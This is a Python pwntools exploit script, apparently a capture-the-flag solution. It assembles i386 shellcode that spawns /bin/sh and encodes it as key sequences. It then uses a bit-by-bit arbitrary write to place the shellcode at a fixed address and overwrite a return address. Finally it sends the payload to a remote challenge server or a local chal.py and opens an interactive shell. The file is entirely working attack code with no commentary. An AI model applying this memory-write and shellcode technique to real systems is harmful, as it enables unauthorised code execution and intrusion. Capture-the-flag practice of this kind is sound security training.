#!/usr/bin/env python3
from pwn import *
context.update(arch="i386", os="linux")
context.log_level = 'error'

a = 'JJ'
b = 'JK'
c = 'JL'
d = 'JM'
e = 'JN'
f = 'JO'
g = 'JP'
h = 'JQ'
i = 'JR'

j = 'JA'
k = 'JB'
l = 'JC'
m = 'JD'
n = 'JE'
o = 'JF'
p = 'JG'
q = 'JH'
r = 'JI'

s = '6Q'
t = '6O'
u = '33JY'
v = 'KM'
w = 'FA1'
x = 'FA2'
y = 'JR'
z = 'FB7'
enter = 'HAAA'

sc = asm('''
  push 11
  pop eax
  push   ebx
  push   0x68732f2f
  push   0x6e69622f
  mov    ebx,esp
  xor ecx,ecx
  int    0x80
''')

a1 = w + y + d
a0 = x + y + d
b1 = w + y + e
b0 = x + y + e

payload = ''

def write(addr, val):
  global payload
  for i in range(32):
    payload += a1 if (addr & (1 << (31 - i))) else a0
  for i in range(32):
    payload += b1 if (val & (1 << (31 - i))) else b0
  payload += enter

base = 0x8048000 + 0xc200

write(base + 4 + 0x10, u32(sc[0x10:0x14]))
write(base + 4 + 0x0c, u32(sc[0x0c:0x10]))
write(base + 4 + 0x08, u32(sc[0x08:0x0c]))
write(base + 4 + 0x04, u32(sc[0x04:0x08]))
write(base + 4, u32(sc[0:0x4]))

ret = 0x080541fc
for i in range(32):
  payload += a1 if (ret & (1 << (31 - i))) else a0

payload += 'C'

conn = remote('nexus-security.club', 6003) if args.REMOTE else process('python3 ./chal.py', shell=True)
conn.sendline(payload)
conn.interactive()
